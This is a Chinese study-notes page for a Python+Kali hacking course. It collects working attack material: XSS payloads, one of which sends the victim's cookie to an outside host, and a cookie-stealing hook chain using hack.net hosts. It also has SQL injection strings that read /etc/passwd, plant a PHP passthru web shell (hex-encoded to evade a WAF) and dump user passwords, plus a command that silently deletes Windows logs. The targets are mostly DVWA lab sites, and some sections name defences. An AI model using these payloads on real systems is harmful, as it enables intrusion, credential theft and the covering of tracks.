# [乾颐堂](https://www.qytang.com/) Python+Kali黑客全套教程

## 0x00 视频 + 源码 + PDF

- videos
  - [Python+Kali黑客全套教程，全程干货+实战技术，小白学习从入门到入狱](https://www.bilibili.com/video/BV17V4y157ih/?spm_id_from=333.337.search-card.all.click&vd_source=7f220845f0d7bc792a045e75a5ac8b8d)
  - [python+kali的全套黑客编程实践教程，全知识点+实践练习，（针对小白/python/kali/网络安全）](https://www.bilibili.com/video/BV1bG4y1H784/?spm_id_from=333.337.search-card.all.click&vd_source=7f220845f0d7bc792a045e75a5ac8b8d)
  - [Python+Kali黑客全套教程，全程干货+实战技术，小白学习从入门到入狱](https://www.bilibili.com/video/BV17V4y157ih/?vd_source=7f220845f0d7bc792a045e75a5ac8b8d#reply136957487232)

- 源码 + PDF

  需要 + up 主 wx

- PDF

  暂存本地 [python&kali 教程](待定)



## 0x01 简单记录

<!--last modify: 20230922-->

- 扫描工具

  ping  /  fping / nping / arping / nbtscan / onesixtyone

- python + nmap

  ```tex
  # https://pypi.org/project/python-nmap/
  # pip install python-nmap
  # import nmap
  ```

  - pypi 中有相关使用方法

- 痕迹清理

  ```shell
  del %WINDIR%\*.log /a/s/q/f # 强制静默删除只读文件
  ```

- nexpose api

  ```tex
  https://<host>:<port>/api/api-version/xml
  ```

- 协议攻击

  ```tex
  mac 泛洪 + mac 欺骗
      macof
      # 防御 port security 技术
  
  dhcp 攻击
      pig.py 干掉合法dhcp 服务器
      非法dhcp 服务器开始干活儿
      # 防御 dhcp snooping 技术
  
  arp 攻击
      arpspoof
      # 防御 DAI 技术
  
  dns spoofing
      ettercap # dns 欺骗
      set # 社会工程学
  ```

- windows 沙盒探测



- web 工具

  ```tex
  BurpSuite
  	Proxy 代理 / Intruder 攻击 / Repeater 重放
      Comparer 可比较两个不同请求页面的响应区别
      Spider 手工爬取+自动爬取
      Scanner 手工+自动
      Sequencer 自动确认Cookies 随机性
      Decoder + Extender 编/解码(绕过) + 扩展(WAF 绕过等)
  AppScan
  ```

- XSS POC & 攻击技巧

  ```tex
  # 手工改确认
  	1. 脚本：<script>alert('xss')</script> # <scr<Script>ipt>alert('xss')</script>
  	2. 超链接：<a href='' onclick=alert('xss')>click it</a>
  	3. 图片：<img src=http://172.16.1.23/a.jpgg onerror=alert('xss')>
  	4. 重定向：<script>window.location="http://www.testfire.net/index.jsp"</script>
  	5. iframe：<iframe width=300 height=100 src="http://dvwa.com/xss_vul/?name=<script>window.location='http://baidu.com/login_cookie.php?sid='%2Bdocumet.cookie;</script>"></iframe>
  	6. DOM：<script>document.body.ierHTML="<div style=visibility.visible;><br/><br/><h1>test</h1></div>";</script>
  
  # 攻击技巧
  	1. hook
  	2. keylogger
      /*
      1. 诱导受害者访问钓鱼网站
      2. 钓鱼网站触发访问目标(可信本地存在cookie)站点
      3. 触发本地PC 下载hook.js 文件
      4. 本地PC 运行hook.js 文件，获取cookie
      5. 发给hacker 站点，收集cookie
      6. hacker 站点以邮件形式发出
  
      http://target.vulhost.com/xss.php # 目标站点
      http://gofish.hack.net/index.jsp # 社工伪造钓鱼网站
      http://hook.hack.net/xss_hook.js # hook 站点
      http://collect.hack.net/xss_hook2email.php # 通过hook 站点收集信息的站点
      */
  
  # 注入点/注入位置
  [XSS 注入点](https://www.xjx100.cn/news/432525.html?action=onClick)
  # 常见绕过方式
  (替换)双写/大小写/转码
  # 存储型XSS
  前端表单长度限制，PC 端修改源码
  1 DOM 型XSS
  在URL 中符号'#' 后面的不会发送给服务端，但响应页面包含符号'#' 后内容且运行写入内容至PC 页面
  存在解码与否问题
  ```
  
- XSS 工具

  ```tex
  # xsser
      1. xsser -u "http://dvwa.com/vulnerabilities/xss_r/" -g "?name=" --cookie="PHPSESSID=h5btppesjqq99igfrc2lr24in4; security=low" -s -V --reverse-check # 反向检查
      2. xsser -u "http://dvwa.com/vulnerabilities/xss_r/" -g "?name=" --cookie="PHPSESSID=h5btppesjqq99igfrc2lr24in4; security=low" -s -V --heuristic # 检查
  
  # BeEF / beef-xss
  	Hooked 主机信息/键盘与鼠标记录查询/Commands 命令模块(颜色)
  	1. Get Cookie / 查表单填写内容 / 获取或修改页面超链接 / 弹出警告页面 / 查询Bug 软件 / 浏览器页面拍照 / 控制PC 进行DoS 等攻击 / 禁止关闭窗口 / 弹窗
  ```
  
- 密码破解

  ```tex
  # hash-identifier
  # john
  	john --format=raw-MD5 user_pass.txt --show
  ```

- SQL 注入

  ```tex
  # 读取服务器重要文件
  ' union select null, load_file('/etc/passwd') --+
  
  # 禁用PrivateTemp 功能
  # /usr/lib/systemd/system/mariadb.service
  # /user/lib/systemd/system/httpd.service
  # 修改PrivateTemp=off
  systemctl daemon-reload
  systemctl restart mariadb.service
  systemctl restart httpd.service
  
  # 写入文件
  ' union select null, "<?php passthru($_GET['cmd']); ?>" into dumpfile "/tmp/cmd.php" --+
  
  # 文件包含漏洞执行代码
  http://www.dvwa.com/vulnerabilities/fi/?page=/tmp/cmd.php&cmd=id
  
  # 防WAF 过滤对PHP 脚本进行转码
  <?php passthru($_GET['cmd']);?> # shell_cmd.php
  
  # 转16 进制
  echo "<?php passthru($_GET['cmd']);?>" |xxd -ps |tr -d '\n' # 3c3f706870207061737374687275285b27636d64275d293b3f3e0a
  
  # 注入
  ' union select null, (3c3f706870207061737374687275285b27636d64275d293b3f3e0a) into dumpfile "/tmp/cmd.php" --+
  
  # 文件包含漏洞执行代码
  http://www.dvwa.com/vulnerabilities/fi/?page=/tmp/cmd.php&cmd=id
  
  # 数据库写入文件
  ' union select null, concat(user, 0x3a, password) from users into outfile '/tmp/mysql.db' --+
  # 批量下载数据库
  http://www.dvwa.com/vulnerabilities/fi/?page=/tmp/mysql.db
  ```

- SQL 注入无权查询inforation_schema 表时

  ```tex
  # ' and column_name is null --+ # 猜列名
  select * from users where id = '' and column_name is null --+ # 如column_name 为username
  
  # ' or column_name='column_value # 猜列值，如列名user 中是否有admin
  # ' or column_name like '%char% # 猜列值，如列名user 中列值是否包含字符a
  # ' or column_name='column_value1' and column_value2='5f4dcc3b5aa765d61d8327deb882cf99 # 爆破密码，如已知列名user 和列值1 为admin，猜另一列值password 
  
  # ' and tables_name.column_name is null --+ # 猜表名
  select * from users where id = '' and tables_name.column_name is null --+ # 如tables_name.column_name 为users.username
  
  # ' and (select count(*) from tables_name) > 0 --+ # 猜表名，可暴露当前使用的数据库名
  ```
  
- CSRF 攻击

  ```tex
  # 关键性操作，二次验证；付款、改密等
  # BP 抓包右击》Engagement tools》Generate CSRF PoC (生成的HTML 视)
  ```

  
